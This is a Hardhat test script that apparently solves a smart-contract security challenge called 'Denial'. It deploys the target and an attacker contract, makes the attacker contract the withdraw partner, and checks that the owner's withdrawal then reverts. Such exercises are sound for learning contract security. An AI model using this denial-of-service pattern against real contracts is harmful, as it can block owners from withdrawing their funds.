import { expect  } from "chai";
import { ethers} from "hardhat";

const {utils} = ethers

describe("Denial", () => {
  it("Solves the challenge", async () => {
    const [deployer, attacker] = await ethers.getSigners()
    const contractFactory = await ethers.getContractFactory("Denial")
    const contract = await contractFactory.connect(deployer).deploy()
    await contract.deployed()

    const attackerContractFactory = await ethers.getContractFactory("DenialAttacker")
    const attackerContract = await attackerContractFactory.connect(attacker).deploy(contract.address)
    await attackerContract.deployed()

    await deployer.sendTransaction({
      to: contract.address,
      value: utils.parseEther('1')
    })

    const setPartnerTx = await contract.connect(attacker).setWithdrawPartner(attackerContract.address)
    await setPartnerTx.wait()
    
    await expect(contract.connect(deployer).withdraw({gasLimit: 10**6})).to.be.reverted
    
  });
});